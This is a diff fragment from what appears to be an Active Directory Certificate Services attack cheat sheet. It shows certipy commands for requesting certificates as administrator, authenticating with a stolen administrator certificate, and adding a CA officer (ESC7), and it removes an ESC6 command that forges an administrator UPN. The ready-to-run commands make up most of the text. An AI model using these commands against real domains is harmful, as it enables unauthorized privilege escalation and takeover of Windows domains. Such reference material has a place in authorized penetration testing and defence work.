@@ -80,10 +80,6 @@ certipy req -u username -p password -dc-ip ip -ca ca -target dc -template templa
 ```
 certipy auth -pfx administrator.pfx -domain domain -u administrator -dc-ip ip
 ```
-## ESC6
-```
-certipy req -u administrator@domain -p password -ca ca -target domain -template template -upn administrator
-```
 ## ESC7
 ```
 certipy ca -ca ca -add-officer username -u username@domain -p password -dc-ip ip -dns-tcp -ns ip
